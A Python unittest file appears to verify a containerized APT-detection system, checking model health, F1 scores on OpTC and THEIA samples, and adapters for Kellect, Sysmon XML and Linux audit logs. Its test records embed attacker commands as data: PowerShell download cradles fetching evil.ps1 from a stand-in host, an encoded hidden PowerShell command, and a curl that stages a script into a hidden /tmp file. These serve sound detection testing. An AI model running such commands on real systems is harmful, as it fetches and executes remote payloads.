#!/usr/bin/env python3
"""End-to-end verification tests for Docker ML, DL, and UI inference containers."""

from __future__ import annotations

import json
from pathlib import Path
import sys
import unittest
import urllib.error
import urllib.request

DOCKER_ROOT = Path(__file__).resolve().parents[1]
PROJECT_ROOT = DOCKER_ROOT.parents[0]
sys.path.insert(0, str(PROJECT_ROOT))
sys.path.insert(0, str(DOCKER_ROOT))

UI_BASE = "http://127.0.0.1:8080"
ML_BASE = "http://127.0.0.1:8001"
DL_BASE = "http://127.0.0.1:8002"


def _http_json(url: str, method: str = "GET", payload: dict | None = None, timeout: float = 30.0):
    data = None if payload is None else json.dumps(payload).encode("utf-8")
    headers = {"Content-Type": "application/json"} if payload is not None else {}
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.status, json.loads(resp.read().decode("utf-8"))


class TestDockerMultiContainerStack(unittest.TestCase):
    def test_sample_manifest_present_and_populated(self) -> None:
        man_path = DOCKER_ROOT / "sample_logs/manifest.json"
        self.assertTrue(man_path.is_file(), "Run Docker/scripts/export_demo_samples.py first")
        man = json.loads(man_path.read_text(encoding="utf-8"))
        ids = {s["id"] for s in man["samples"]}
        self.assertEqual(ids, {"optc_sc1_test", "optc_sc2_test", "optc_sc3_test", "theia_e3_test"})
        for s in man["samples"]:
            self.assertGreater(s["test_malicious"], 10)
            self.assertTrue((DOCKER_ROOT / "sample_logs" / s["file"]).is_file())

    def test_live_containers_health_and_ui_gateway(self) -> None:
        for url, key in ((f"{ML_BASE}/health", "num_trees"), (f"{DL_BASE}/health", "param_count")):
            code, body = _http_json(url)
            self.assertEqual(code, 200)
            self.assertEqual(body["status"], "ok")
            self.assertIn(key, body)

        code, status = _http_json(f"{UI_BASE}/api/status")
        self.assertEqual(code, 200)
        self.assertEqual(status["ml_service"]["status"], "ok")
        self.assertEqual(status["dl_service"]["status"], "ok")

        with urllib.request.urlopen(f"{UI_BASE}/", timeout=10.0) as r:
            html = r.read().decode("utf-8")
            self.assertEqual(r.status, 200)
            self.assertIn("APT Multi-Container Inference", html)

    def test_live_predictions_across_all_4_attack_scenarios(self) -> None:
        for sid in ("optc_sc1_test", "optc_sc2_test", "optc_sc3_test"):
            code, res = _http_json(f"{UI_BASE}/api/analyze-sample/{sid}", method="POST")
            self.assertEqual(code, 200)
            ml_gt = res["ml_summary"]["vs_ground_truth"]
            dl_gt = res["dl_summary"]["vs_ground_truth"]
            self.assertIsNotNone(ml_gt, msg=f"Missing ML GT for {sid}")
            self.assertIsNotNone(dl_gt, msg=f"Missing DL GT for {sid}")
            self.assertGreater(ml_gt["f1"], 0.85, msg=f"Low ML F1 on {sid}: {ml_gt}")
            self.assertGreater(dl_gt["f1"], 0.85, msg=f"Low DL F1 on {sid}: {dl_gt}")

        code, theia = _http_json(f"{UI_BASE}/api/analyze-sample/theia_e3_test", method="POST")
        self.assertEqual(code, 200)
        dl_theia_gt = theia["dl_summary"]["vs_ground_truth"]
        self.assertIsNotNone(dl_theia_gt)
        self.assertGreater(dl_theia_gt["f1"], 0.90, msg=f"Low DL THEIA F1: {dl_theia_gt}")
        # ML LightGBM OpTC-only must safely flag THEIA samples as out_of_domain rather than hallucinating
        self.assertEqual(theia["ml_summary"]["scored_events"], 0)
        # Verify ExpandableMixHeadCausalIL recognized THEIA-specific scenarios/stages
        self.assertTrue(any(k.startswith("THEIA_") for k in theia["dl_summary"]["scenario_breakdown"]))
        self.assertTrue(any(k.startswith("THEIA_") for k in theia["dl_summary"]["stage_breakdown"]))

    def test_blind_paste_without_labels_returns_alerts(self) -> None:
        raw_path = DOCKER_ROOT / "sample_logs/optc_sc1_empire_staging_test.jsonl"
        blind_lines = []
        for ln in raw_path.read_text(encoding="utf-8").splitlines():
            obj = json.loads(ln)
            obj.pop("_meta_truth", None)
            obj.pop("label", None)
            blind_lines.append(json.dumps(obj))
        code, res = _http_json(
            f"{UI_BASE}/api/analyze",
            method="POST",
            payload={"raw_logs": "\n".join(blind_lines)},
        )
        self.assertEqual(code, 200)
        self.assertIsNone(res["ml_summary"]["vs_ground_truth"])
        self.assertGreater(res["ml_summary"]["malicious_detected"], 0)
        self.assertGreater(res["dl_summary"]["malicious_detected"], 0)

    def test_external_schema_adapters_kellect_sysmon_and_xml(self) -> None:
        # 1. Raw Kellect4APT without adapter fails cleanly (scored_events=0); with adapter extracts eCAR tokens & DL alert
        kellect_rec = {
            "Event": "ProcessStart",
            "PID": 4444,
            "PName": "powershell.exe",
            "PPID": 1234,
            "PPName": "wscript.exe",
            "Host-UUID": "TEST-WIN-HOST",
            "TimeStamp": 133341559047115019,
            "args": {
                "ImageFileName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoP -NonI -W Hidden -C \"IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/evil.ps1')\"",
                "UserSID": "S-1-5-18",
            },
        }
        code_raw, raw_out = _http_json(
            f"{UI_BASE}/api/analyze",
            method="POST",
            payload={"raw_logs": json.dumps(kellect_rec), "adapt_external": False},
        )
        self.assertEqual(code_raw, 200)
        self.assertEqual(raw_out["ml_summary"]["scored_events"], 0)
        self.assertEqual(raw_out["dl_summary"]["malicious_detected"], 0)

        code_adp, adp_out = _http_json(
            f"{UI_BASE}/api/analyze",
            method="POST",
            payload={"raw_logs": json.dumps(kellect_rec), "adapt_external": True},
        )
        self.assertEqual(code_adp, 200)
        self.assertEqual(adp_out["ml_summary"]["scored_events"], 1)
        self.assertEqual(adp_out["events"][0]["domain_hint"], "kellect4apt_etw->ecar")
        self.assertGreaterEqual(adp_out["events"][0]["ml"]["matched_token_count"], 8)
        self.assertLess(adp_out["events"][0]["ml"]["oov_rate"], 0.25)
        self.assertEqual(adp_out["dl_summary"]["malicious_detected"], 1)

        # 2. Raw Sysmon XML (<Event>...</Event>) parses and scores through gateway
        sysmon_xml = (
            "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>"
            "<System><Provider Name='Microsoft-Windows-Sysmon'/>"
            "<EventID>1</EventID><TimeCreated SystemTime='2020-11-03T15:50:19.000Z'/>"
            "<Channel>Microsoft-Windows-Sysmon/Operational</Channel>"
            "<Computer>win-test.local</Computer></System>"
            "<EventData>"
            "<Data Name='UtcTime'>2020-11-03 15:50:19.000</Data>"
            "<Data Name='ProcessGuid'>{11111111-1111-1111-1111-111111111111}</Data>"
            "<Data Name='ParentProcessGuid'>{00000000-0000-0000-0000-000000000001}</Data>"
            "<Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>"
            "<Data Name='ParentImage'>C:\\Windows\\system32\\wscript.exe</Data>"
            "<Data Name='CommandLine'>powershell.exe -NoP -W Hidden -C \"IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')\"</Data>"
            "</EventData></Event>"
        )
        code_xml, xml_out = _http_json(
            f"{UI_BASE}/api/analyze",
            method="POST",
            payload={"raw_logs": sysmon_xml, "adapt_external": True},
        )
        self.assertEqual(code_xml, 200)
        self.assertEqual(xml_out["events"][0]["domain_hint"], "windows_sysmon->ecar")
        self.assertEqual(xml_out["ml_summary"]["scored_events"], 1)
        self.assertGreaterEqual(xml_out["events"][0]["ml"]["matched_token_count"], 8)
        self.assertEqual(xml_out["dl_summary"]["malicious_detected"], 1)

    def test_kltn_linux_audit_and_windows_xml_bridge_adapters(self) -> None:
        linux_audit = [
            {
                "os": "linux",
                "src": "auditd",
                "kind": "netconn",
                "host": "ubuntu1",
                "ts": 1795721001000000,
                "pid": 3002,
                "ppid": 3001,
                "image": "/usr/bin/curl",
                "pimage": "/usr/bin/dash",
                "cmd": "curl -s http://203.0.113.66/stage.sh -o /tmp/.kworker",
                "rip": "203.0.113.66",
                "rport": 80,
                "proto": "tcp",
                "outbound": True,
                "uid": 1001,
            },
            {
                "os": "linux",
                "src": "auditd",
                "kind": "filemod",
                "host": "ubuntu1",
                "ts": 1795721002000000,
                "pid": 3002,
                "ppid": 3001,
                "image": "/usr/bin/curl",
                "pimage": "/usr/bin/dash",
                "cmd": "curl -s http://203.0.113.66/stage.sh -o /tmp/.kworker",
                "tpath": "/tmp/.kworker",
                "uid": 1001,
            },
        ]
        _, ml_lin = _http_json(f"{ML_BASE}/predict", method="POST", payload={"records": linux_audit, "adapt_external": True})
        _, dl_lin = _http_json(f"{DL_BASE}/predict", method="POST", payload={"records": linux_audit, "adapt_external": True})
        self.assertEqual(ml_lin["scored_events"], 0)  # OpTC Seed-02 ML stays Windows-only
        self.assertEqual(dl_lin["scored_events"], 2)
        self.assertEqual(dl_lin["predictions"][1]["domain_hint"], "kltn_linux_audit->theia_l3")
        self.assertEqual(dl_lin["predictions"][1]["pred_binary"], 1)

        kltn_win = {
            "raw": {
                "date": 1795720410.8,
                "System": (
                    "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>"
                    "<System><Provider Name='Microsoft-Windows-Sysmon'/><EventID>1</EventID>"
                    "<TimeCreated SystemTime='2026-11-26T19:20:01.000Z'/>"
                    "<Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>desktop-57ngalr</Computer></System>"
                    "<EventData><Data Name='ProcessGuid'>{a1}</Data><Data Name='ParentProcessGuid'>{a0}</Data>"
                    "<Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>"
                    "<Data Name='ParentImage'>C:\\Windows\\System32\\cmd.exe</Data>"
                    "<Data Name='User'>DESKTOP-57NGALR\\Admin</Data>"
                    "<Data Name='CommandLine'>powershell.exe -NoP -NonI -W Hidden -Enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA=</Data></EventData></Event>"
                ),
            }
        }
        _, ml_win = _http_json(f"{ML_BASE}/predict", method="POST", payload={"records": [kltn_win], "adapt_external": True})
        _, dl_win = _http_json(f"{DL_BASE}/predict", method="POST", payload={"records": [kltn_win], "adapt_external": True})
        self.assertEqual(ml_win["scored_events"], 1)
        self.assertEqual(ml_win["malicious_detected"], 1)
        self.assertEqual(dl_win["malicious_detected"], 1)


if __name__ == "__main__":
    unittest.main()
